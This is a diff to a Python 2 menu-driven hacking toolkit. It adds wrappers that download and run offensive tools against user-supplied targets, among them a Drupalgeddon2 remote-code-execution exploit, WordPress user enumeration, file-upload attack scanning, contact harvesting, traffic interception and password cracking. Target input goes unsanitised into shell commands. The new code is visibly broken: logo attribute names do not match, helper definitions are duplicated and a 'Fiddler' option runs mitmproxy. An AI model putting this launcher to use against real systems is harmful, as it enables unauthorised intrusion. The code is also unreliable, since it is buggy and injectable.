@@ -149,8 +149,7 @@ class sayahac:
        {4}--Exploitation Tools
        {5}--Sniffing & Spoofing
        {6}--Web Hacking
-       {7}--Private Web Hacking
-       {8}--Post Exploitation
+       {7}--Post Exploitation
        {0}--INSTALL & UPDATE
        {99}-EXIT\n
      ''')
@@ -286,8 +285,8 @@ wwwwwww           wwwww           wwwwwww eeeeeeeeeeee    b:::::bbbbbbbbb
         print(self.menuLogo)
         print("   {1}--Drupal Hacking ")
         print("   {2}--Inurlbr")
-        print("   {3}--Wordpress & Joomla Scanner")
-        print("   {4}--Gravity Form Scanner")
+        print("   {3}--Nikto Web Server Tool")
+        print("   {4}--HTTP/HTTPS interception Using Fiddlertool")
         print("   {5}--File Upload Checker")
         print("   {6}--Wordpress Exploit Scanner")
         print("   {7}--Wordpress Plugins Scanner")
@@ -301,17 +300,17 @@ wwwwwww           wwwww           wwwwwww eeeeeeeeeeee    b:::::bbbbbbbbb
         choiceweb = raw_input(sayahacPrompt)
         clearScr()
         if choiceweb == "1":
-            maine()
+            DrupalExploitTool()
         elif choiceweb == "2":
-            ifinurl()
+            InurlbrTool()
         elif choiceweb == '3':
-            wppjmla()
+            NiktoTool()
         elif choiceweb == "4":
-            gravity()
+            FiddlerTool()
         elif choiceweb == "5":
-            sqlscan()
+            FuxploiderTool()
         elif choiceweb == "6":
-            wpminiscanner()
+            WPExploitTool()
         elif choiceweb == "7":
             wppluginscan()
         elif choiceweb == "8":
@@ -323,7 +322,7 @@ wwwwwww           wwwww           wwwwwww eeeeeeeeeeee    b:::::bbbbbbbbb
         elif choiceweb == "11":
             brutex()
         elif choiceweb == "12":
-            arachni()
+            ArachniTool()
         elif choiceweb == "99":
             sayahac()
         else:
@@ -335,32 +334,509 @@ wwwwwww           wwwww           wwwwwww eeeeeeeeeeee    b:::::bbbbbbbbb
         self.__init__()
 
 
-class privateWebHacking:
-    menuLogo = '''
+class DrupalExploitTool:
+
+    drupal_logo = """
+  _____                     _
+ |  __ \                   (_)
+ | |  | |  _   _  _ __ ___   _
+ | |  | | | | | || '_ ` _ \ | |
+ | |__| | | |_| || | | | | || |
+ |_____/   \__,_||_| |_| |_||_|
+"""  
+     
     
-
-______       _               _                 _    _        _     
-| ___ \     (_)             | |               | |  | |      | |    
-| |_/ /_ __  _ __   __ __ _ | |_  ___  ______ | |  | |  ___ | |__  
-|  __/| '__|| |\ \ / // _` || __|/ _ \|______|| |/\| | / _ \| '_ \ 
-| |   | |   | | \ V /| (_| || |_|  __/        \  /\  /|  __/| |_) |
-\_|   |_|   |_|  \_/  \__,_| \__|\___|         \/  \/  \___||_.__/ 
-                                                                   
-                                                                   
-                                                                                                                                                                                                                          
-
-    '''
-
     def __init__(self):
-        clearScr()
-        print(self.menuLogo)
-        target = raw_input("Enter Target IP: ")
-        Fscan(target)
-        self.completed()
+        self.installDir = toolDir + "drupal-exploit"
+        self.gitRepo = "https://github.com/dreadlocked/Drupalgeddon2.git"
+        
+        self.targetPrompt = "   Enter Target Drupal URL: "
 
-    def completed(self):
-        raw_input("Completed, click return to go back")
-        self.__init__()
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.installDir + "/drupalgeddon2.py")
+
+    def install(self):
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && chmod +x drupalgeddon2.py" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.drupalLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.drupalLogo)
+        print("   Drupal Exploit for: %s\n" % target)
+        print("   {1}--Check Vulnerability (CVE-2018-7600)")
+        print("   {2}--Exploit RCE (Remote Code Execution)")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("drupal ~# ")
+        clearScr()
+        logPath = "logs/drupal-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
+        try:
+            if response == "1":
+                os.system("python3 %s/drupalgeddon2.py --check %s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("python3 %s/drupalgeddon2.py --exploit %s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
+
+
+class InurlbrTool:
+
+    inurlbr_logo = """
+  ___        _    _       
+ |_ _|_ __  (_)  | | ___  
+  | || '_ \ | |  | |/ _ \ 
+  | || | | || |  | | (_) |
+ |___|_| |_||_|  |_|\___/ 
+"""
+
+    
+    def __init__(self):
+        self.installDir = toolDir + "inurlbr"
+        self.gitRepo = "https://github.com/googleinurl/SCANNER-INURLBR.git"
+        
+        self.targetPrompt = "   Enter Target URL/Domain: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile("/usr/bin/inurlbr") or os.path.isfile("/usr/local/bin/inurlbr")
+
+    def install(self):
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && chmod +x inurlbr.php" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.inurlbrLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.inurlbrLogo)
+        print("   Inurlbr scan for: %s\n" % target)
+        print("   {1}--Simple Scan (Basic search)")
+        print("   {2}--Advanced Scan (Multiple search)")
+        print("   {99}-Return to information gathering menu \n")
+        response = raw_input("inurlbr ~# ")
+        clearScr()
+        logPath = "logs/inurlbr-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
+        try:
+            if response == "1":
+                os.system("php %s/inurlbr.php --dork %s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("php %s/inurlbr.php --dork-file %s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+class WPExploitTool:
+    wpexploit_logo = """
+ __          __           _                            _      
+ \ \        / /          | |                          | |     
+  \ \  /\  / /__  _ __   | |    _   _  _ __   _ __   __| | ___ 
+   \ \/  \/ // _ \| '_ \  | |   | | | || '_ \ | '__| / _` |/ __|
+    \  /\  /|  __/| | | | | |___| |_| || |_) || |   | (_| |\__ \\
+     \/  \/  \___||_| |_| |_____|\__,_|| .__/ |_|    \__,_||___/
+                                      | |                       
+                                      |_|                       
+"""
+    def __init__(self):
+        self.installDir = toolDir + "wpscan-cli"
+        self.gitRepo = "https://github.com/wpscanteam/wpscan.git"
+        
+        self.targetPrompt = "   Enter Target WordPress URL: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.installDir + "/wpscan.rb")
+
+    def install(self):
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && gem install bundler && bundle install" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.wpexploitLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.wpexploitLogo)
+        print("   WordPress Exploit Scan for: %s\n" % target)
+        print("   {1}--Basic Vulnerability Scan")
+        print("   {2}--Enumerate Plugins")
+        print("   {3}--Enumerate Users")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("wpscan ~# ")
+        clearScr()
+        logPath = "logs/wpexploit-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
+        try:
+            if response == "1":
+                os.system("ruby %s/wpscan.rb --url %s --enumerate vp > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("ruby %s/wpscan.rb --url %s --enumerate p > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                os.system("ruby %s/wpscan.rb --url %s --enumerate u > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
+class ArachniTool:
+    arachni_logo = """
+     ___                        _     _ 
+    / _ \                      (_)   | |
+   / /_\ \ _ __   __ _  _ __    _  __| |
+   |  _  || '__| / _` || '_ \  | |/ _` |
+   | | | || |   | (_| || | | | | | (_| |
+   \_| |_/|_|    \__,_||_| |_| |_|\__,_|
+"""
+    def __init__(self):
+        self.installDir = toolDir + "arachni"
+        self.downloadUrl = "https://github.com/Arachni/arachni/releases/latest/download/arachni-x.x.x-x86_64-linux.tar.gz"
+        self.extractedDir = self.installDir + "/arachni-x.x.x"
+
+        self.targetPrompt = "   Enter Target URL for Vulnerability Scan: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.extractedDir + "/bin/arachni")
+
+    def install(self):
+        # Download and extract Arachni
+        os.system("mkdir -p %s" % self.installDir)
+        os.system("wget %s -O %s/arachni.tar.gz" % (self.downloadUrl, self.installDir))
+        os.system("cd %s && tar -zxvf arachni.tar.gz" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.arachniLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.arachniLogo)
+        print("   Arachni Scan for: %s\n" % target)
+        print("   {1}--Basic Scan")
+        print("   {2}--Full Audit Scan")
+        print("   {3}--Scan with Plugin")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("arachni ~# ")
+        clearScr()
+        logPath = "logs/arachni-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".afr"
+        try:
+            if response == "1":
+                os.system("%s/bin/arachni %s --report-save-path=%s" % (self.extractedDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("%s/bin/arachni %s --checks=all --report-save-path=%s" % (self.extractedDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                plugin = raw_input("Enter the plugin name (e.g., xss, csrf): ")
+                os.system("%s/bin/arachni %s --plugin=%s --report-save-path=%s" % (self.extractedDir, target, plugin, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
+
+class FuxploiderTool:
+    fuxploider_logo = """
+  ______              _       _           _           
+ |  ____|            (_)     | |         | |          
+ | |__ _ __ ___  __ _ _ _ __ | |__   ___ | | ___ _ __  
+ |  __| '__/ _ \/ _` | | '_ \| '_ \ / _ \| |/ _ \ '__| 
+ | |  | | |  __/ (_| | | | | | | | | (_) | |  __/ |    
+ |_|  |_|  \___|\__, |_|_| |_|_| |_|\___/|_|\___|_|    
+                __/ |                                  
+               |___/                                   
+"""
+    def __init__(self):
+        self.installDir = toolDir + "fuxploider"
+        self.gitRepo = "https://github.com/almandin/fuxploider.git"
+        
+        self.targetPrompt = "   Enter Target URL for File Upload Vulnerability Check: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.installDir + "/fuxploider.py")
+
+    def install(self):
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && pip install -r requirements.txt" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.fuxploiderLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.fuxploiderLogo)
+        print("   Fuxploider Scan for: %s\n" % target)
+        print("   {1}--Basic File Upload Vulnerability Scan")
+        print("   {2}--Advanced Scan with Extensions")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("fuxploider ~# ")
+        clearScr()
+        logPath = "logs/fuxploider-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
+        try:
+            if response == "1":
+                os.system("python2 %s/fuxploider.py --url %s --simple > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("python2 %s/fuxploider.py --url %s --extensions php,jpg,png --advanced > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+class NiktoTool:
+    nikto_logo = """
+ _   _ _ _       _      
+| \ | (_) |     (_)     
+|  \| |_| |_ ___ _  ___ 
+| . ` | | __/ __| |/ __|
+| |\  | | |_\__ \ | (__ 
+|_| \_|_|\__|___/_|\___|
+"""
+    def __init__(self):
+        self.installDir = toolDir + "nikto"
+        self.gitRepo = "https://github.com/sullo/nikto.git"
+        
+        self.targetPrompt = "   Enter Target URL for Vulnerability Scan: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.installDir + "/program/nikto.pl")
+
+    def install(self):
+        # Clone the Nikto repository and set it up
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+
+    def run(self):
+        clearScr()
+        print(self.niktoLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.niktoLogo)
+        print("   Nikto Scan for Target: %s\n" % target)
+        print("   {1}--Basic Scan")
+        print("   {2}--Scan with Tuning Options")
+        print("   {3}--Scan for Specific Vulnerabilities")
+        print("   {4}--Scan with Output to Report File")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("nikto ~# ")
+        clearScr()
+        logPath = "logs/nikto-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
+        try:
+            if response == "1":
+                os.system("perl %s/program/nikto.pl -h %s" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                tuning = raw_input("Enter tuning options (e.g., 123bde): ")
+                os.system("perl %s/program/nikto.pl -h %s -Tuning %s" % (self.installDir, target, tuning))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                vuln_scan = raw_input("Enter vulnerability string to search (e.g., XSS, SQLI): ")
+                os.system("perl %s/program/nikto.pl -h %s -T %s" % (self.installDir, target, vuln_scan))
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                os.system("perl %s/program/nikto.pl -h %s -output %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+class FiddlerTool:
+    fiddler_logo = """
+  ______ _     _ _ _           
+ |  ____| |   (_) | |          
+ | |__  | |__  _| | |_   _  ___
+ |  __| | '_ \| | | | | | |/ _ \\
+ | |____| | | | | | | |_| |  __/
+ |______|_| |_|_|_|_|\__,_|\___|
+"""
+    def __init__(self):
+        self.installDir = toolDir + "mitmproxy"
+        
+        self.targetPrompt = "   Enter target host (e.g., example.com) or press Enter for all traffic: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        # Check if mitmproxy is installed
+        return os.system("which mitmproxy > /dev/null 2>&1") == 0
+
+    def install(self):
+        # Install mitmproxy via pip
+        os.system("pip install mitmproxy")
+
+    def run(self):
+        clearScr()
+        print(self.fiddlerLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.fiddlerLogo)
+        print("   Mitmproxy (Fiddler-like) for Target: %s\n" % (target if target else "All Traffic"))
+        print("   {1}--Basic Intercept")
+        print("   {2}--Log HTTP/HTTPS Traffic")
+        print("   {3}--Filter by Hostname")
+        print("   {4}--Save Traffic to File")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("mitmproxy ~# ")
+        clearScr()
+        logPath = "logs/mitmproxy-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("mitmproxy")
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("mitmproxy --showhost")
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                if not target:
+                    target = raw_input("Enter target host: ")
+                os.system("mitmproxy --set block_global=false -b %s" % target)
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                os.system("mitmproxy -w %s" % logPath)
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
 
 
 class postExploitationMenu:
@@ -430,7 +906,7 @@ class informationGatheringMenu:
         print(self.menuLogo)
 
         print("  {1}--Nmap - Network Mapper")
-        print("  {2}--Setoolkit")
+        print("  {2}--Recon-ng")
         print("  {3}--Host To IP")
         print("  {4}--WPScan")
         print("  {5}--CMSmap")
@@ -443,7 +919,7 @@ class informationGatheringMenu:
         if choice2 == "1":
             nmap()
         elif choice2 == "2":
-            setoolkit()
+            ReconNGTool()
         elif choice2 == "3":
             host2ip()
         elif choice2 == "4":
@@ -453,7 +929,7 @@ class informationGatheringMenu:
         elif choice2 == "6":
             XSStrike()
         elif choice2 == "7":
-            doork()
+            GoogleDorkTool()
         elif choice2 == "8":
             crips()
         elif choice2 == "99":
@@ -540,31 +1016,86 @@ _/      _/  _/    _/    _/    _/_/_/  _/_/_/
             self.menu(target)
 
 
-class setoolkit:
+
+class ReconNGTool:
+    recon_logo = """
+  ______               _   _      _   _   
+ |  ____|             (_) | |    (_) | |  
+ | |__     ___   ___   _  | | __  _  | |_ 
+ |  __|   / _ \ / _ \ | | | |/ / | | | __|
+ | |     |  __/| (_) || | |   <  | | | |_ 
+ |_|      \___| \___/ |_| |_|\_\ |_|  \__|
+"""
     def __init__(self):
-        self.installDir = toolDir + "setoolkit"
-        self.gitRepo = "https://github.com/trustedsec/social-engineer-toolkit.git"
+        self.installDir = toolDir + "recon-ng"
+        self.gitRepo = "https://github.com/lanmaster53/recon-ng.git"
+        
+        self.targetPrompt = "   Enter the domain or IP to gather intelligence on: "
 
         if not self.installed():
             self.install()
             self.run()
         else:
-            print(alreadyInstalled)
             self.run()
-        response = raw_input(continuePrompt)
 
     def installed(self):
-        return (os.path.isfile("/usr/bin/setoolkit"))
+        return os.path.isfile(self.installDir + "/recon-ng")
 
     def install(self):
-        os.system("apt-get --force-yes -y install git apache2 python-requests libapache2-mod-php \
-            python-pymssql build-essential python-pexpect python-pefile python-crypto python-openssl")
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("cd %s && python setup.py install" % self.installDir)
+        # Clone the Recon-ng repository
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s && pip install -r REQUIREMENTS" % self.installDir)
 
     def run(self):
-        os.system("setoolkit")
+        clearScr()
+        print(self.reconLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.reconLogo)
+        print("   Recon-ng Intelligence Gathering for: %s\n" % target)
+        print("   {1}--Basic Domain Info Gathering")
+        print("   {2}--Whois Lookup")
+        print("   {3}--DNS Enumeration")
+        print("   {4}--IP Geolocation")
+        print("   {5}--Gather Contacts (Email, Name)")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("recon-ng ~# ")
+        clearScr()
+        logPath = "logs/recon-ng-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("%s/recon-ng -m recon/domains-hosts/shodan_hostname -o SOURCE=%s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system("%s/recon-ng -m recon/domains-hosts/whois_pocs -o SOURCE=%s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                os.system("%s/recon-ng -m recon/domains-hosts/brute_hosts -o SOURCE=%s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                os.system("%s/recon-ng -m recon/hosts-hosts/ip_geolocation -o SOURCE=%s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "5":
+                os.system("%s/recon-ng -m recon/contacts-contacts/email_contacts -o SOURCE=%s > %s" % (self.installDir, target, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
 
 
 class host2ip:
@@ -748,52 +1279,85 @@ class XSStrike:
         os.system("python %s/xsstrike" % self.installDir)
 
 
-class doork:
-    doorkLogo = '''
-    
-
-  ____      U  ___ u   U  ___ u   ____      _  __    
- |  _"\      \/"_ \/    \/"_ \/U |  _"\ u  |"|/ /    
-/| | | |     | | | |    | | | | \| |_) |/  | ' /     
-U| |_| |\.-,_| |_| |.-,_| |_| |  |  _ <  U/| . \\u   
- |____/ u \_)-\___/  \_)-\___/   |_| \_\   |_|\_\    
-  |||_         \\         \\     //   \\_,-,>> \\,-. 
- (__)_)       (__)       (__)   (__)  (__)\.)   (_/  
-                                       
-                                                                                                   
-
-    '''
-
+class GoogleDorkTool:
+    google_dork_logo = """
+  _____            _       _     
+ / ____|          (_)     | |    
+| |  __  ___  ___  _ _ __ | |__  
+| | |_ |/ _ \/ _ \| | '_ \| '_ \ 
+| |__| |  __/ (_) | | | | | | | |
+ \_____|\___|\___/|_|_| |_|_| |_|
+"""
     def __init__(self):
-        self.installDir = toolDir + "doork"
-        self.gitRepo = "https://github.com/AeonDave/doork.git"
+        self.targetPrompt = "   Enter your Google Dork query: "
+        self.dorkPrompt = "   Enter the target domain (e.g., example.com): "
 
-        if not self.installed():
-            self.install()
+        self.run()
+
+    def run(self):
         clearScr()
-        print(self.doorkLogo)
-        target = raw_input("   Enter a Target: ")
-        self.run(target)
-        response = raw_input(continuePrompt)
+        print(self.googleDorkLogo)
+        target = raw_input(self.dorkPrompt)
+        self.menu(target)
 
-    def installed(self):
-        return (os.path.isdir(self.installDir))
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("pip install beautifulsoup4 requests Django==1.11")
-
-    def run(self, target):
-        if not "http://" in target:
-            target = "http://" + target
-        logPath = "logs/doork-" + \
-            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
+    def menu(self, target):
+        clearScr()
+        print(self.googleDorkLogo)
+        print("   Google Dorking for domain: %s\n" % target)
+        print("   {1}--Search for Indexes (intitle:index.of)")
+        print("   {2}--Search for Config Files (ext:xml | ext:conf)")
+        print("   {3}--Search for Login Pages (inurl:admin)")
+        print("   {4}--Search for SQL Errors (intext:\"sql syntax\")")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("google-dork ~# ")
+        clearScr()
         try:
-            os.system("python %s/doork.py -t %s -o %s" %
-                      (self.installDir, target, logPath))
+            if response == "1":
+                query = "intitle:index.of site:%s" % target
+                self.google_search(query)
+            elif response == "2":
+                query = "ext:xml OR ext:conf site:%s" % target
+                self.google_search(query)
+            elif response == "3":
+                query = "inurl:admin site:%s" % target
+                self.google_search(query)
+            elif response == "4":
+                query = "intext:\"sql syntax\" site:%s" % target
+                self.google_search(query)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
         except KeyboardInterrupt:
-            pass
+            self.menu(target)
+
+    def google_search(self, query):
+        url = "https://www.google.com/search?q=" + query.replace(' ', '+')
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+        response = requests.get(url, headers=headers)
+        
+        soup = BeautifulSoup(response.text, "html.parser")
+        search_results = soup.find_all('a')
+
+        print("\n--- Google Dork Results ---\n")
+        for link in search_results:
+            href = link.get('href')
+            if 'url?q=' in href and not 'webcache' in href:
+                actual_link = href.split('url?q=')[1].split('&sa=U')[0]
+                print(actual_link)
+        
+        print("\n--- End of Results ---\n")
+        raw_input(continuePrompt)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
+
 
 
 class crips:
@@ -858,14 +1422,17 @@ U|  _"\ uU  /"\  u / __"| u/ __"| u  __        __ |  _"\
         clearScr()
         print(self.menuLogo)
         print("   {1}--Cupp - Common User Passwords Profiler")
+        print("  {2}--John the ripper")
         print(
-            "   {2}--BruteX - Automatically bruteforces all services running on a target\n")
+            "   {3}--BruteX - Automatically bruteforces all services running on a target\n")
         print("   {99}-Back To Main Menu \n")
         choice3 = raw_input("passwd ~# ")
         clearScr()
         if choice3 == "1":
             cupp()
         elif choice3 == "2":
+            JohnTheRipperTool()
+        elif choice3 == "3":
             brutex()
         elif choice3 == "99":
             sayahac()
@@ -921,6 +1488,81 @@ class cupp:
 '''
 Wireless Testing Tools Classes
 '''
+class JohnTheRipperTool:
+    john_logo = """
+     _       _     _   _                
+    | |     (_)   | | (_)               
+    | | ___  _  __| |  _ ___  ___  _ __ 
+    | |/ _ \| |/ _` | | / __|/ _ \| '__|
+    | | (_) | | (_| |_| \__ \ (_) | |   
+    |_|\___/|_|\__,_(_) |___/\___/|_|   
+"""
+    def __init__(self):
+        self.installDir = toolDir + "john"
+        self.gitRepo = "https://github.com/openwall/john.git"
+        
+        self.targetPrompt = "   Enter the path to the password hash file: "
+
+        if not self.installed():
+            self.install()
+            self.run()
+        else:
+            self.run()
+
+    def installed(self):
+        return os.path.isfile(self.installDir + "/run/john")
+
+    def install(self):
+        # Clone the John the Ripper repository and build it
+        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
+        os.system("cd %s/src && ./configure && make" % self.installDir)
+
+    def run(self):
+        clearScr()
+        print(self.johnLogo)
+        target = raw_input(self.targetPrompt)
+        self.menu(target)
+
+    def menu(self, target):
+        clearScr()
+        print(self.johnLogo)
+        print("   John the Ripper Attack for Target: %s\n" % target)
+        print("   {1}--Basic Crack")
+        print("   {2}--Dictionary Attack")
+        print("   {3}--Incremental Brute-force Attack")
+        print("   {4}--Show Cracked Passwords")
+        print("   {99}-Return to previous menu \n")
+        response = raw_input("john ~# ")
+        clearScr()
+        logPath = "logs/john-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
+        try:
+            if response == "1":
+                os.system("%s/run/john %s" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                wordlist = raw_input("Enter the path to the wordlist file (e.g., /usr/share/wordlists/rockyou.txt): ")
+                os.system("%s/run/john --wordlist=%s %s" % (self.installDir, wordlist, target))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                os.system("%s/run/john --incremental %s" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "4":
+                os.system("%s/run/john --show %s" % (self.installDir, target))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+# Helper functions
+def clearScr():
+    os.system('clear')
+
+toolDir = "/opt/tools/"  # Change to appropriate directory
+continuePrompt = "Press Enter to continue..."
+
 
 
 class wirelessTestingMenu:
@@ -941,16 +1583,19 @@ class wirelessTestingMenu:
         clearScr()
         print(self.menuLogo)
         print("   {1}--reaver ")
-        print("   {2}--pixiewps")
-        print("   {3}--Bluetooth Honeypot GUI Framework \n")
+        print("   {2}--KismetTool")
+        print("    {3}--Aircrack-ng")
+        print("   {4}--Bluetooth Honeypot GUI Framework \n")
         print("   {99}-Back To The Main Menu \n")
         choice4 = raw_input(sayahacPrompt) 
         clearScr()
         if choice4 == "1":
             reaver()
         elif choice4 == "2":
-            pixiewps()
+            KismetTool()
         elif choice4 == "3":
+            AircrackNGTool()
+        elif choice4 == "4":
             bluepot()
         elif choice4 == "99":
             sayahac()
@@ -990,28 +1635,175 @@ class reaver:
         os.system("reaver --help")
 
 
-class pixiewps:
+class KismetTool:
+    kismet_logo = """
+  _  __ _     _   
+ | |/ /(_)   | |  
+ | ' /  _  __| |_ 
+ |  <  | |/ _` __|
+ | . \ | | (_| |_ 
+ |_|\_\|_|\__,_(_)
+"""
     def __init__(self):
-        self.installDir = toolDir + "pixiewps"
-        self.gitRepo = "https://github.com/wiire/pixiewps.git"
+        self.installDir = toolDir + "kismet"
+        self.gitRepo = "https://github.com/kismetwireless/kismet.git"
+        
+        self.targetPrompt = "   Enter Wireless Interface (e.g., wlan0): "
 
         if not self.installed():
             self.install()
-        clearScr()
-        self.run()
+            self.run()
+        else:
+            self.run()
 
